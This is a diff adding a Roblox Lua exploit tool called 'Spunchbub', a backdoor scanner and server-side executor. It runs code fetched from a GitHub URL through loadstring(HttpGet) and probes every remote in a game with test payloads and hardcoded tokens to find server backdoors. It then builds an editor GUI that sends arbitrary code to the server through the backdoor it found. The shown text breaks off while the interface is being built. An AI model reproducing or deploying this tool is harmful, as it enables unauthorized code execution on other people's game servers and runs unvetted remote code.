@@ -1,0 +1,1064 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rig67/sixone/refs/heads/main/wl.lua"))()
+
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/Rig67/sixone/refs/heads/main/notification.lua.txt", true))()
+
+    local player = game.Players.LocalPlayer
+	local mouse = player:GetMouse()
+	local userInputService = game:GetService("UserInputService")
+	local runService = game:GetService("RunService")
+	local tweenService = game:GetService("TweenService")
+	local HttpService = game:GetService("HttpService")
+	local RunService = game:GetService("RunService")
+	
+	
+	local EXCLUDED_REMOTES = {
+		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
+		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
+		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
+		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
+		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
+		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
+		GetServerVersion = true, GetClientId = true, GetInventory = true,
+		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
+		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
+		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
+		ReportAbuse = true
+	}
+	
+	local SAFE_LOCATIONS = {
+		["CoreGui"] = true,
+		["ServerStorage"] = true,
+		["ReplicatedFirst"] = true,
+		["ServerScriptService"] = true
+	}
+	
+	local foundExploit = false
+	local FinishedFound = false
+	local mode = 3
+	local bg = 1
+	local remoteEvent, remoteFunction
+	local scanTime = 0
+	
+	local function isLikelyBackdoorRemote(remote)
+		local name = remote.Name
+		local parent = remote.Parent
+	
+	
+		if SAFE_LOCATIONS[parent.ClassName] then
+			return false
+		end
+		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
+			return false
+		end 
+		if EXCLUDED_REMOTES[name] then
+			return false
+		end
+		if name == "rbxAssetid_core__temp_3023g78" then
+		        return false
+		end
+        if name == "rbx.bd_cssr6-O1" then 
+                return false
+        end
+        if name == "_FEBYPASS32" then
+                return false
+        end
+        if name == "rbx.bd_cssr6-01" then 
+                return false
+        end
+        if name == "spunch.bd_cssr6-O1" then
+                return false
+        end
+		if name == "ChatEvent" then
+		        return false
+		end
+		if name == "AntiBackdoorScanner" then 
+			    return false
+		end
+		if parent.Parent.Name=='HDAdminHDClient' and remote.Parent.Name=='Signals' then
+			return false
+		end
+		if parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
+			return false
+		end
+		if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
+			return false
+		end
+	
+	
+		return true
+	end
+	
+	
+	
+		
+	local function testRemote(remote, isFunction)
+	if foundExploit then return false end
+	if not isLikelyBackdoorRemote(remote) then return false end
+
+	local modelName = "Spunchbub_" .. tostring(os.clock()):gsub("%.", "")
+	local rs = game:GetService("ReplicatedStorage")
+	local foundEvent = false
+	local testFlagName = "__spunchbub_test_flag_" .. tostring(os.clock()):gsub("%.", "")
+	local globalPayload = "getgenv()." .. testFlagName .. " = true"
+
+	local connection = rs.DescendantAdded:Connect(function(inst)
+		if inst.Name == modelName then
+			foundEvent = true
+		end
+	end)
+
+	local function cleanup()
+		connection:Disconnect()
+		local f = rs:FindFirstChild(modelName)
+		if f then f:Destroy() end
+	end
+
+	local success = pcall(function()
+		local payload = [[
+			local m=Instance.new("Folder")
+			m.Name="]] .. modelName .. [["
+			m.Parent=game:GetService("ReplicatedStorage")
+		]]
+
+		task.spawn(function()
+			pcall(function()
+				if isFunction then
+					local ran = false
+					pcall(function()
+						local r = remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
+						if r then ran = true end
+					end)
+					if not ran then
+						pcall(function()
+							local r = remote:InvokeServer(payload .. "\nreturn true")
+							if r then ran = true end
+						end)
+					end
+				   if not ran then 
+                      pcall(function()
+			            local r = remote:InvokeServer({
+                                    token = "Scr1pt3dX_Acc3ss#XD!Private",
+                                    code = payload .. "\nreturn true"  
+                                  })
+				          if r then ran = true end
+		                end)
+					end
+					pcall(function()
+						remote:InvokeServer(globalPayload)
+					end)
+				else
+					remote:FireServer(payload)
+					remote:FireServer(globalPayload)
+				end
+			end)
+          end)
+        end)
+	local timeout = 1
+	local start = os.clock()
+	while os.clock() - start < timeout do
+		if foundEvent or rs:FindFirstChild(modelName) then
+			foundEvent = true
+			break
+		end
+		task.wait(0)
+	end
+
+	local globalFlagTriggered = getgenv()[testFlagName] == true
+	if globalFlagTriggered then
+		getgenv()[testFlagName] = nil
+	end
+
+	cleanup()
+
+	if (foundEvent or globalFlagTriggered) and not foundExploit then
+		foundExploit = true
+		if isFunction then
+			remoteFunction = remote
+		else
+			remoteEvent = remote
+		end
+		return true
+	end
+
+	   return false
+	end
+
+local function findRemote()
+    local trueStart = os.clock()
+    foundExploit = false
+    remoteEvent = nil
+    remoteFunction = nil
+
+    local remotes = {}
+    for _, remote in ipairs(game:GetDescendants()) do
+        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+            table.insert(remotes, remote)
+        end
+    end
+
+    print(string.format("Spunchbub BD: scanning %d remotes", #remotes))
+
+    local MAX_CONCURRENT = 128
+    local activeTasks = 0
+    local taskDone = Instance.new("BindableEvent")
+
+    local foundObject = nil
+
+    for i = 1, #remotes do
+        if foundExploit then break end
+
+        while activeTasks >= MAX_CONCURRENT do
+            taskDone.Event:Wait()
+        end
+
+        activeTasks += 1
+        task.spawn(function()
+            local ok, result = pcall(function()
+                return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
+            end)
+
+            if ok and result then
+                foundExploit = true
+                foundObject = remotes[i]
+                if remotes[i]:IsA("RemoteEvent") then
+                    remoteEvent = remotes[i]
+                else
+                    remoteFunction = remotes[i]
+                end
+                print("Spunchbub BD: ", remotes[i]:GetFullName())
+            end
+
+            activeTasks -= 1
+            taskDone:Fire()
+        end)
+    end
+
+    while activeTasks > 0 and not foundExploit do
+        taskDone.Event:Wait()
+    end
+
+    scanTime = os.clock() - trueStart
+    FinishedFound = true
+
+    if not foundExploit then
+        notify.Warn("Spunchbub","No backdoor was found.")
+    end
+
+    print(string.format("Spunchbub : scan completed in %.3f seconds", scanTime))
+    
+    return foundObject
+end
+
+	
+function fireRemoteEvent(codes)
+    local success = false
+    local tried = 0
+    local errors = {}
+
+    local function try(func)
+        tried += 1
+        local ok, err = pcall(func)
+        if ok then
+            success = true
+        else
+            table.insert(errors, err)
+        end
+    end
+
+    try(function()
+        if remoteEvent then
+            remoteEvent:FireServer(codes)
+        end
+    end)
+    try(function()
+        if remoteFunction then 
+           remoteFunction:InvokeServer({
+             token = "Scr1pt3dX_Acc3ss#XD!Private",
+             code = codes
+          })
+        end
+    end)
+    try(function()
+        if remoteFunction then
+            remoteFunction:InvokeServer("starlightTSS", codes)
+        end
+    end)
+    try(function()
+        if remoteFunction then
+            remoteFunction:InvokeServer(codes)
+        end
+    end)
+    if not foundExploit then
+        notify.Warn("Spunchbub", "No backdoor.")
+    elseif not success then
+        notify.Warn("Spunchbub", "RemoteEvent errors:")
+        for _, err in ipairs(errors) do
+            notify.Error(err)
+        end
+    end
+end
+
+local LMG2 = {};
+
+LMG2["Scan_SpunchLOL_1"] = Instance.new("ScreenGui", game.CoreGui);
+LMG2["Scan_SpunchLOL_1"]["Name"] = [[Scan_SpunchLOL]];
+LMG2["Scan_SpunchLOL_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+LMG2["Frame_2"] = Instance.new("Frame", LMG2["Scan_SpunchLOL_1"]);
+LMG2["Frame_2"]["BorderSizePixel"] = 0;
+LMG2["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
+LMG2["Frame_2"]["Size"] = UDim2.new(0, 471, 0, 310);
+LMG2["Frame_2"]["Position"] = UDim2.new(0, 332, 0, 210);
+
+
+LMG2["UICorner_3"] = Instance.new("UICorner", LMG2["Frame_2"]);
+LMG2["UICorner_3"]["CornerRadius"] = UDim.new(0, 6);
+
+
+LMG2["UIStroke_4"] = Instance.new("UIStroke", LMG2["Frame_2"]);
+LMG2["UIStroke_4"]["Transparency"] = 0.5;
+LMG2["UIStroke_4"]["Color"] = Color3.fromRGB(98, 98, 98);
+
+
+LMG2["Frame_5"] = Instance.new("Frame", LMG2["Frame_2"]);
+LMG2["Frame_5"]["BorderSizePixel"] = 0;
+LMG2["Frame_5"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
+LMG2["Frame_5"]["Size"] = UDim2.new(0, 457, 0, 25);
+LMG2["Frame_5"]["Position"] = UDim2.new(0, 8, 0, 10);
+
+
+LMG2["UICorner_6"] = Instance.new("UICorner", LMG2["Frame_5"]);
+
+
+
+LMG2["UIStroke_7"] = Instance.new("UIStroke", LMG2["Frame_5"]);
+LMG2["UIStroke_7"]["Transparency"] = 0.5;
+LMG2["UIStroke_7"]["Color"] = Color3.fromRGB(98, 98, 98);
+
+
+LMG2["TextLabel_8"] = Instance.new("TextLabel", LMG2["Frame_5"]);
+LMG2["TextLabel_8"]["Active"] = true;
+LMG2["TextLabel_8"]["BorderSizePixel"] = 0;
+LMG2["TextLabel_8"]["TextSize"] = 15;
+LMG2["TextLabel_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2["TextLabel_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
+LMG2["TextLabel_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2["TextLabel_8"]["BackgroundTransparency"] = 1;
+LMG2["TextLabel_8"]["RichText"] = true;
+LMG2["TextLabel_8"]["Size"] = UDim2.new(0, 138, 0, 10);
+LMG2["TextLabel_8"]["Text"] = [[ <font color="#f7f30a">Spunchbub</font> - Private Backdoor |  Backdoor Scanner]];
+LMG2["TextLabel_8"]["Position"] = UDim2.new(0, 110, 0, 7);
+
+
+LMG2["ImageButton_9"] = Instance.new("ImageButton", LMG2["Frame_5"]);
+LMG2["ImageButton_9"]["BorderSizePixel"] = 0;
+LMG2["ImageButton_9"]["BackgroundTransparency"] = 1;
+-- LMG2L["ImageButton_9"]["ImageContent"] = ;
+LMG2["ImageButton_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2["ImageButton_9"]["ImageColor3"] = Color3.fromRGB(231, 231, 231);
+LMG2["ImageButton_9"]["Image"] = [[rbxassetid://110786993356448]];
+LMG2["ImageButton_9"]["Size"] = UDim2.new(0, 24, 0, 24);
+LMG2["ImageButton_9"]["Position"] = UDim2.new(0, 430, 0, 0);
+
+
+LMG2["LocalScript_a"] = Instance.new("LocalScript", LMG2["ImageButton_9"]);
+
+
+
+LMG2["ImageLabel_b"] = Instance.new("ImageLabel", LMG2["Frame_2"]);
+LMG2["ImageLabel_b"]["BorderSizePixel"] = 0;
+LMG2["ImageLabel_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2["ImageLabel_b"]["ImageTransparency"] = 0.43;
+-- LMG2L["ImageLabel_b"]["ImageContent"] = ;
+LMG2["ImageLabel_b"]["Image"] = [[rbxassetid://89640858025803]];
+LMG2["ImageLabel_b"]["Size"] = UDim2.new(0, 277, 0, 272);
+LMG2["ImageLabel_b"]["BackgroundTransparency"] = 1;
+LMG2["ImageLabel_b"]["Position"] = UDim2.new(0.204, 0, 0.035, 0);
+
+
+LMG2["ScanButton_c"] = Instance.new("TextButton", LMG2["Frame_2"]);
+LMG2["ScanButton_c"]["TextWrapped"] = true;
+LMG2["ScanButton_c"]["RichText"] = true;
+LMG2["ScanButton_c"]["BorderSizePixel"] = 0;
+LMG2["ScanButton_c"]["TextSize"] = 20;
+LMG2["ScanButton_c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2["ScanButton_c"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
+LMG2["ScanButton_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
+LMG2["ScanButton_c"]["BackgroundTransparency"] = 0.4;
+LMG2["ScanButton_c"]["Size"] = UDim2.new(0, 240, 0, 90);
+LMG2["ScanButton_c"]["Text"] = [[Scan Backdoor]];
+LMG2["ScanButton_c"]["Name"] = [[ScanButton]];
+LMG2["ScanButton_c"]["Position"] = UDim2.new(0, 114, 0, 110);
+
+
+LMG2["UICorner_d"] = Instance.new("UICorner", LMG2["ScanButton_c"]);
+
+
+
+LMG2["UIStroke_e"] = Instance.new("UIStroke", LMG2["ScanButton_c"]);
+LMG2["UIStroke_e"]["Transparency"] = 0.5;
+LMG2["UIStroke_e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2["UIStroke_e"]["Color"] = Color3.fromRGB(98, 98, 98);
+
+
+LMG2["Frame_f"] = Instance.new("Frame", LMG2["Frame_2"]);
+LMG2["Frame_f"]["BorderSizePixel"] = 0;
+LMG2["Frame_f"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
+LMG2["Frame_f"]["Size"] = UDim2.new(0, 457, 0, 25);
+LMG2["Frame_f"]["Position"] = UDim2.new(0, 6, 0.8, 26);
+
+
+LMG2["UICorner_10"] = Instance.new("UICorner", LMG2["Frame_f"]);
+LMG2["UICorner_10"]["CornerRadius"] = UDim.new(0, 6);
+
+
+LMG2["UIStroke_11"] = Instance.new("UIStroke", LMG2["Frame_f"]);
+LMG2["UIStroke_11"]["Transparency"] = 0.5;
+LMG2["UIStroke_11"]["Color"] = Color3.fromRGB(98, 98, 98);
+
+
+LMG2["Credits_12"] = Instance.new("TextLabel", LMG2["Frame_f"]);
+LMG2["Credits_12"]["BorderSizePixel"] = 0;
+LMG2["Credits_12"]["TextSize"] = 15;
+LMG2["Credits_12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2["Credits_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
+LMG2["Credits_12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2["Credits_12"]["BackgroundTransparency"] = 1;
+LMG2["Credits_12"]["RichText"] = true;
+LMG2["Credits_12"]["Size"] = UDim2.new(0, 92, 0, 16);
+LMG2["Credits_12"]["Text"] = [[ <font color="#f7f30a">Spunchbub</font> Backdoor Scanner | Made by Rig6?!?!?]];
+LMG2["Credits_12"]["Name"] = [[Credits]];
+LMG2["Credits_12"]["Position"] = UDim2.new(0, 130, 0, 4);
+
+function EnableDrag(frame)
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		
+		-- Tweening for smoothness
+		local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+		TweenService:Create(frame, tweenInfo, {Position = targetPos}):Play()
+	end
+
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	frame.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+
+task.spawn(function()
+    EnableDrag(LMG2["Frame_2"])
+end)
+
+local function C_a()
+	local script = LMG2["LocalScript_a"];
+	script.Parent.MouseButton1Click:Connect(function()	
+	     script.Parent.Parent.Parent.Parent:Destroy()	
+	end)	
+end;
+task.spawn(C_a);
+LMG2["ScanButton_c"].MouseButton1Click:Connect(function()
+    notify.Info("Spunchbub","Scanning backdoor..")
+    findRemote()
+    
+    while not FinishedFound do
+        task.wait(0.1)
+    end
+    
+    if foundExploit then
+    LMG2["Scan_SpunchLOL_1"]:Destroy()
+
+LMG2L = {};
+LMG2L["SpunchLOL_1"] = Instance.new("ScreenGui", game.CoreGui);
+LMG2L["SpunchLOL_1"]["Name"] = [[SpunchLOL]];
+LMG2L["SpunchLOL_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+LMG2L["SpunchLOL_1"]["ResetOnSpawn"] = false;
+
+LMG2L["Main_2"] = Instance.new("Frame", LMG2L["SpunchLOL_1"]);
+LMG2L["Main_2"]["BorderSizePixel"] = 0;
+LMG2L["Main_2"]["BackgroundColor3"] = Color3.fromRGB(26, 27, 32);
+LMG2L["Main_2"]["Size"] = UDim2.new(0, 471, 0, 310);
+LMG2L["Main_2"]["Position"] = UDim2.new(0, 166, 0, 156);
+LMG2L["Main_2"]["Name"] = [[Main]];
+
+LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["Main_2"]);
+LMG2L["UICorner_3"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["UIStroke_4"] = Instance.new("UIStroke", LMG2L["Main_2"]);
+LMG2L["UIStroke_4"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_4"]["Transparency"] = 0.5;
+
+LMG2L["Frame_5"] = Instance.new("Frame", LMG2L["Main_2"]);
+LMG2L["Frame_5"]["BorderSizePixel"] = 0;
+LMG2L["Frame_5"]["BackgroundColor3"] = Color3.fromRGB(56, 56, 56);
+LMG2L["Frame_5"]["Size"] = UDim2.new(0, 471, 0, 310);
+LMG2L["Frame_5"]["BackgroundTransparency"] = 1;
+
+LMG2L["hide_6"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
+LMG2L["hide_6"]["BorderSizePixel"] = 0;
+-- LMG2L["hide_6"]["Image"] = "rbxassetid://100033680381365";
+LMG2L["hide_6"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
+LMG2L["hide_6"]["Size"] = UDim2.new(0, 34, 0, 34);
+LMG2L["hide_6"]["Name"] = [[hide]];
+LMG2L["hide_6"]["Position"] = UDim2.new(0, 309, 0, 271);
+
+LMG2L["ImageLabelbla"] = Instance.new("ImageLabel", LMG2L["hide_6"]);
+LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://100033680381365";
+LMG2L["ImageLabelbla"]["Size"] = UDim2.new(0, 25, 0, 25);
+LMG2L["ImageLabelbla"]["BackgroundTransparency"] = 1;
+LMG2L["ImageLabelbla"]["Position"] = UDim2.new(0, 4, 0, 4);
+
+LMG2L["UICorner_7"] = Instance.new("UICorner", LMG2L["hide_6"]);
+LMG2L["UICorner_7"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["LocalScript_8"] = Instance.new("LocalScript", LMG2L["hide_6"]);
+
+LMG2L["UIStroke_9"] = Instance.new("UIStroke", LMG2L["hide_6"]);
+LMG2L["UIStroke_9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_9"]["Thickness"] = 1;
+LMG2L["UIStroke_9"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_9"]["Transparency"] = 0.5;
+
+LMG2L["UICorner_a"] = Instance.new("UICorner", LMG2L["Frame_5"]);
+LMG2L["UICorner_a"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["ImageButton2_b"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
+LMG2L["ImageButton2_b"]["BorderSizePixel"] = 0;
+LMG2L["ImageButton2_b"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
+LMG2L["ImageButton2_b"]["Size"] = UDim2.new(0, 34, 0, 34);
+LMG2L["ImageButton2_b"]["Name"] = [[ImageButton2]];
+LMG2L["ImageButton2_b"]["Position"] = UDim2.new(0, 389, 0, 271);
+
+LMG2L["ImageLabella"] = Instance.new("ImageLabel", LMG2L["ImageButton2_b"]);
+LMG2L["ImageLabella"]["Image"] = "rbxassetid://7072721335";
+LMG2L["ImageLabella"]["Size"] = UDim2.new(0, 22, 0, 22);
+LMG2L["ImageLabella"]["BackgroundTransparency"] = 1;
+LMG2L["ImageLabella"]["Position"] = UDim2.new(0, 6, 0, 6);
+
+LMG2L["LocalScript_ni"] = Instance.new("LocalScript", LMG2L["ImageButton2_b"])
+
+LMG2L["UICorner_c"] = Instance.new("UICorner", LMG2L["ImageButton2_b"]);
+LMG2L["UICorner_c"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["UIStroke_d"] = Instance.new("UIStroke", LMG2L["ImageButton2_b"]);
+LMG2L["UIStroke_d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_d"]["Thickness"] = 1;
+LMG2L["UIStroke_d"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_d"]["Transparency"] = 0.5;
+
+LMG2L["clr_e"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["clr_e"]["TextStrokeTransparency"] = 0;
+LMG2L["clr_e"]["BorderSizePixel"] = 0;
+LMG2L["clr_e"]["TextSize"] = 18;
+LMG2L["clr_e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["clr_e"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
+LMG2L["clr_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+LMG2L["clr_e"]["Size"] = UDim2.new(0, 100, 0, 33);
+LMG2L["clr_e"]["Text"] = [[Clear]];
+LMG2L["clr_e"]["Name"] = [[clr]];
+LMG2L["clr_e"]["Position"] = UDim2.new(0, 148, 0, 272);
+
+LMG2L["UICorner_f"] = Instance.new("UICorner", LMG2L["clr_e"]);
+LMG2L["UICorner_f"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["LocalScript_10"] = Instance.new("LocalScript", LMG2L["clr_e"]);
+
+LMG2L["UIStroke_11"] = Instance.new("UIStroke", LMG2L["clr_e"]);
+LMG2L["UIStroke_11"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_11"]["Thickness"] = 1;
+LMG2L["UIStroke_11"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_11"]["Transparency"] = 0.5;
+
+LMG2L["ImageButton_12"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
+LMG2L["ImageButton_12"]["BorderSizePixel"] = 0;
+LMG2L["ImageButton_12"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
+LMG2L["ImageButton_12"]["Size"] = UDim2.new(0, 34, 0, 34);
+LMG2L["ImageButton_12"]["Position"] = UDim2.new(0, 429, 0, 271);
+
+LMG2L["LocalScript_r6"] = Instance.new("LocalScript", LMG2L["ImageButton_12"])
+
+LMG2L["ImageLabel2"] = Instance.new("ImageLabel", LMG2L["ImageButton_12"]);
+LMG2L["ImageLabel2"]["Image"] = "rbxassetid://4941166750";
+LMG2L["ImageLabel2"]["Size"] = UDim2.new(0, 22, 0, 22);
+LMG2L["ImageLabel2"]["BackgroundTransparency"] = 1;
+LMG2L["ImageLabel2"]["Position"] = UDim2.new(0, 6, 0, 6);
+
+LMG2L["UICorner_13"] = Instance.new("UICorner", LMG2L["ImageButton_12"]);
+LMG2L["UICorner_13"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["UIStroke_14"] = Instance.new("UIStroke", LMG2L["ImageButton_12"]);
+LMG2L["UIStroke_14"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_14"]["Thickness"] = 1;
+LMG2L["UIStroke_14"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_14"]["Transparency"] = 0.5;
+
+LMG2L["EditorScroll"] = Instance.new("ScrollingFrame", LMG2L["Frame_5"]);
+LMG2L["EditorScroll"]["Name"] = [[EditorScroll]];
+LMG2L["EditorScroll"]["Active"] = true;
+LMG2L["EditorScroll"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 0);
+LMG2L["EditorScroll"]["BackgroundTransparency"] = 0.5;
+LMG2L["EditorScroll"]["BorderSizePixel"] = 0;
+LMG2L["EditorScroll"]["Position"] = UDim2.new(0, 6, 0, 42); 
+LMG2L["EditorScroll"]["Size"] = UDim2.new(0, 458, 0, 223);
+LMG2L["EditorScroll"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+LMG2L["EditorScroll"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
+LMG2L["EditorScroll"]["ScrollBarThickness"] = 6;
+LMG2L["EditorScroll"]["ZIndex"] = 999;
+
+LMG2L["UIStroke_16"] = Instance.new("UIStroke", LMG2L["EditorScroll"]);
+LMG2L["UIStroke_16"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_16"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_16"]["Transparency"] = 0.5;
+
+LMG2L["UICorner_17"] = Instance.new("UICorner", LMG2L["EditorScroll"]);
+LMG2L["UICorner_17"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["Editor_15"] = Instance.new("TextBox", LMG2L["EditorScroll"]);
+LMG2L["Editor_15"]["Name"] = [[Editor]];
+LMG2L["Editor_15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["Editor_15"]["PlaceholderColor3"] = Color3.fromRGB(204, 204, 204);
+LMG2L["Editor_15"]["ZIndex"] = 999;
+LMG2L["Editor_15"]["BorderSizePixel"] = 0;
+LMG2L["Editor_15"]["TextSize"] = 15;
+LMG2L["Editor_15"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
+LMG2L["Editor_15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+LMG2L["Editor_15"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 0);
+LMG2L["Editor_15"]["RichText"] = true;
+LMG2L["Editor_15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["Editor_15"]["MultiLine"] = true;
+LMG2L["Editor_15"]["ClearTextOnFocus"] = false;
+LMG2L["Editor_15"]["PlaceholderText"] = [[-- boi what the helly 67]];
+LMG2L["Editor_15"]["Size"] = UDim2.new(1, -8, 0, 210);
+LMG2L["Editor_15"]["Position"] = UDim2.new(0, 4, 0, 4);
+LMG2L["Editor_15"]["Text"] = [[]];
+LMG2L["Editor_15"]["BackgroundTransparency"] = 1;
+LMG2L["Editor_15"]["AutomaticSize"] = Enum.AutomaticSize.Y;
+
+LMG2L["Editor_15"]["Position"] = UDim2.new(0, 40, 0, 4); 
+LMG2L["Editor_15"]["Size"] = UDim2.new(1, -45, 0, 210);
+
+-- 1. Setup the LineNumbers Label with AutomaticSize
+LMG2L["LineNumbers"] = Instance.new("TextLabel", LMG2L["EditorScroll"]);
+LMG2L["LineNumbers"]["Name"] = [[LineNumbers]];
+LMG2L["LineNumbers"]["BackgroundTransparency"] = 1;
+LMG2L["LineNumbers"]["TextColor3"] = Color3.fromRGB(100, 100, 100);
+LMG2L["LineNumbers"]["TextSize"] = 15;
+LMG2L["LineNumbers"]["FontFace"] = LMG2L["Editor_15"]["FontFace"];
+LMG2L["LineNumbers"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+LMG2L["LineNumbers"]["TextXAlignment"] = Enum.TextXAlignment.Right;
+LMG2L["LineNumbers"]["ZIndex"] = 1000;
+
+-- KEY CHANGES FOR INFINITE HEIGHT:
+LMG2L["LineNumbers"]["Size"] = UDim2.new(0, 30, 0, 0); -- Height 0, but...
+LMG2L["LineNumbers"]["AutomaticSize"] = Enum.AutomaticSize.Y; -- ...it grows with text
+LMG2L["LineNumbers"]["Position"] = UDim2.new(0, 4, 0, 4);
+LMG2L["LineNumbers"]["Text"] = [[1]];
+
+-- 2. Ensure the Editor doesn't wrap (Wrapping breaks line number alignment)
+LMG2L["Editor_15"]["TextWrapped"] = false;
+
+-- 3. Optimized Line Counter
+local function UpdateLineNumbers()
+    local text = LMG2L["Editor_15"].Text
+    -- Count newlines efficiently
+    local _, lineCount = text:gsub("\n", "\n")
+    lineCount = lineCount + 1
+    
+    -- Create the vertical list of numbers
+    local t = {}
+    for i = 1, lineCount do
+        table.insert(t, i)
+    end
+    
+    LMG2L["LineNumbers"].Text = table.concat(t, "\n")
+end
+
+-- 4. Listen for changes
+LMG2L["Editor_15"]:GetPropertyChangedSignal("Text"):Connect(UpdateLineNumbers)
+
+LMG2L["Title_18"] = Instance.new("Frame", LMG2L["Frame_5"]);
+LMG2L["Title_18"]["BorderSizePixel"] = 0;
+LMG2L["Title_18"]["BackgroundColor3"] = Color3.fromRGB(26, 27, 32);
+LMG2L["Title_18"]["Size"] = UDim2.new(0, 457, 0, 25);
+LMG2L["Title_18"]["Position"] = UDim2.new(0, 6, 0, 6);
+LMG2L["Title_18"]["Name"] = [[Title]];
+
+LMG2L["close_19"] = Instance.new("ImageButton", LMG2L["Title_18"]);
+LMG2L["close_19"]["BorderSizePixel"] = 0;
+LMG2L["close_19"]["Image"] = "rbxassetid://110786993356448";
+LMG2L["close_19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["close_19"]["ImageColor3"] = Color3.fromRGB(230, 230, 230);
+LMG2L["close_19"]["BackgroundTransparency"] = 1;
